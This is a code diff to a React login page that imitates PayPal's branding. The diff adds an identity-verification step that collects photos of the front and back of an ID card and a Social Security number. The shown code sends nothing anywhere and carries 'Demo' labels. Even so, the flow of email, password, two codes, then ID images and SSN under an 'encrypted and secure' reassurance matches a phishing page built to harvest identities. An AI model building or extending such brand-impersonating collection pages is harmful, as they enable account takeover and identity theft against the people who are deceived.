@@ -3,7 +3,7 @@ import { PayPalFullLogo } from "@/components/PayPalLogo";
 import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2";
+type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2" | "verify-documents";
 
 export default function LoginPage() {
   const [email, setEmail] = useState("");
@@ -11,6 +11,9 @@ export default function LoginPage() {
   const [verificationCode, setVerificationCode] = useState("");
   const [verificationCode2, setVerificationCode2] = useState("");
   const [showPassword, setShowPassword] = useState(false);
+  const [idCardFront, setIdCardFront] = useState<File | null>(null);
+  const [idCardBack, setIdCardBack] = useState<File | null>(null);
+  const [ssn, setSsn] = useState("");
   const [step, setStep] = useState<LoginStep>("email");
   const [isLoading, setIsLoading] = useState(false);
   const [selectedMethod, setSelectedMethod] = useState<"sms" | "email">("sms");
@@ -78,16 +81,7 @@ export default function LoginPage() {
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
-      toast({
-        title: "Verification Successful",
-        description: "Demo: You would now be logged in to your PayPal account.",
-      });
-      setStep("email");
-      setEmail("");
-      setPassword("");
-      setVerificationCode("");
-      setVerificationCode2("");
-      setCodeSent(false);
+      setStep("verify-documents");
     }, 800);
   };
 
@@ -115,6 +109,172 @@ export default function LoginPage() {
     setStep("verify-code");
     setVerificationCode2("");
   };
+
+  const handleDocumentVerification = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!idCardFront || !idCardBack || ssn.length < 9) return;
+    
+    setIsLoading(true);
+    setTimeout(() => {
+      setIsLoading(false);
+      toast({
+        title: "Verification Complete",
+        description: "Demo: Identity verified successfully. You would now be logged in.",
+      });
+      // Reset all states
+      setStep("email");
+      setEmail("");
+      setPassword("");
+      setVerificationCode("");
+      setVerificationCode2("");
+      setIdCardFront(null);
+      setIdCardBack(null);
+      setSsn("");
+      setCodeSent(false);
+    }, 1500);
+  };
+
+  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (side === "front") {
+        setIdCardFront(file);
+      } else {
+        setIdCardBack(file);
+      }
+    }
+  };
+
+  const formatSSN = (value: string) => {
+    const numbers = value.replace(/\D/g, "").slice(0, 9);
+    if (numbers.length <= 3) return numbers;
+    if (numbers.length <= 5) return `${numbers.slice(0, 3)}-${numbers.slice(3)}`;
+    return `${numbers.slice(0, 3)}-${numbers.slice(3, 5)}-${numbers.slice(5)}`;
+  };
+
+  const renderVerifyDocumentsStep = () => (
+    <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
+      <div className="flex flex-col items-center mb-6">
+        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
+          <User className="w-8 h-8 text-[#0070e0]" />
+        </div>
+        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
+          Verify your identity
+        </h2>
+        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
+          Please upload your ID card and provide your SSN
+        </p>
+      </div>
+
+      <div className="space-y-5">
+        {/* ID Card Front */}
+        <div>
+          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
+            ID Card (Front) *
+          </label>
+          <div className="relative">
+            <input
+              type="file"
+              accept="image/*"
+              onChange={(e) => handleFileUpload(e, "front")}
+              className="hidden"
+              id="id-front"
+              data-testid="input-id-front"
+            />
+            <label
+              htmlFor="id-front"
+              className="flex items-center justify-center w-full h-[120px] border-2 border-dashed border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md cursor-pointer hover:border-[#0070e0] transition-colors bg-[#f9f9f9] dark:bg-[#1a1a1a]"
+            >
+              {idCardFront ? (
+                <div className="text-center">
+                  <p className="text-[14px] text-[#0070e0] font-medium">{idCardFront.name}</p>
+                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">Click to change</p>
+                </div>
+              ) : (
+                <div className="text-center">
+                  <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">Click to upload</p>
+                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG, PNG (max 5MB)</p>
+                </div>
+              )}
+            </label>
+          </div>
+        </div>
+
+        {/* ID Card Back */}
+        <div>
+          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
+            ID Card (Back) *
+          </label>
+          <div className="relative">
+            <input
+              type="file"
+              accept="image/*"
+              onChange={(e) => handleFileUpload(e, "back")}
+              className="hidden"
+              id="id-back"
+              data-testid="input-id-back"
+            />
+            <label
+              htmlFor="id-back"
+              className="flex items-center justify-center w-full h-[120px] border-2 border-dashed border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md cursor-pointer hover:border-[#0070e0] transition-colors bg-[#f9f9f9] dark:bg-[#1a1a1a]"
+            >
+              {idCardBack ? (
+                <div className="text-center">
+                  <p className="text-[14px] text-[#0070e0] font-medium">{idCardBack.name}</p>
+                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">Click to change</p>
+                </div>
+              ) : (
+                <div className="text-center">
+                  <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">Click to upload</p>
+                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG, PNG (max 5MB)</p>
+                </div>
+              )}
+            </label>
+          </div>
+        </div>
+
+        {/* SSN Input */}
+        <div>
+          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
+            Social Security Number *
+          </label>
+          <input
+            type="text"
+            inputMode="numeric"
+            placeholder="XXX-XX-XXXX"
+            value={ssn}
+            onChange={(e) => setSsn(formatSSN(e.target.value))}
+            className="w-full h-[48px] px-4 text-[15px] border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#6c7378] dark:placeholder-[#8f8f8f] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
+            data-testid="input-ssn"
+            maxLength={11}
+          />
+          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-2">
+            Demo: Enter any 9 digits
+          </p>
+        </div>
+
+        <button
+          type="submit"
+          className="paypal-btn-primary flex items-center justify-center gap-2"
+          disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9 || isLoading}
+          data-testid="button-verify-documents"
+        >
+          {isLoading ? (
+            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+          ) : (
+            "Submit Documents"
+          )}
+        </button>
+
+        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
+          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
+            <Lock className="w-3 h-3 inline mr-1" />
+            Your information is encrypted and secure
+          </p>
+        </div>
+      </div>
+    </form>
+  );
 
   const renderVerifyCode2Step = () => (
     <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
@@ -607,6 +767,7 @@ export default function LoginPage() {
           {step === "verify-code" && renderVerifyCodeStep()}
           {step === "verifying" && renderVerifyingStep()}
           {step === "verify-code-2" && renderVerifyCode2Step()}
+          {step === "verify-documents" && renderVerifyDocumentsStep()}
         </div>
 
         {/* Security Badge */}
